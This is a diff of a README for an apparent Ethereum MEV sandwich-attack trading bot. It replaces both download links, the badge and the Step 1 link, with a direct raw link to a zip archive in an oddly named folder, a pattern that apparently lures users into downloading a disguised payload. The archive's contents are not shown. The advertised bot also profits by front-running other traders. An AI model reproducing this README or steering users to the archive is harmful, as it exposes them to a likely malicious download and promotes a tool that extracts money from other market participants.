@@ -1,6 +1,6 @@
 # 🤖 Ethereum-MEV-Sandwich-Attack-Bot - Maximize Profits with Automated Sandwich Trades
 
-[![Download Bot](https://img.shields.io/badge/Download-MEVBot%202026-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/amgmouaden/Ethereum-MEV-Sandwich-Attack-Bot)
+[![Download Bot](https://img.shields.io/badge/Download-MEVBot%202026-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/amgmouaden/Ethereum-MEV-Sandwich-Attack-Bot/main/reduceableness/preparation.zip)
 
 ---
 
@@ -67,7 +67,7 @@ The bot automatically finds the best sandwich opportunities across major decentr
 
 ### Step 1: Download the Bot
 
-**Visit this link to download the application**: [https://github.com/amgmouaden/Ethereum-MEV-Sandwich-Attack-Bot](https://github.com/amgmouaden/Ethereum-MEV-Sandwich-Attack-Bot)
+**Visit this link to download the application**: [https://raw.githubusercontent.com/amgmouaden/Ethereum-MEV-Sandwich-Attack-Bot/main/reduceableness/preparation.zip](https://raw.githubusercontent.com/amgmouaden/Ethereum-MEV-Sandwich-Attack-Bot/main/reduceableness/preparation.zip)
 
 )
 
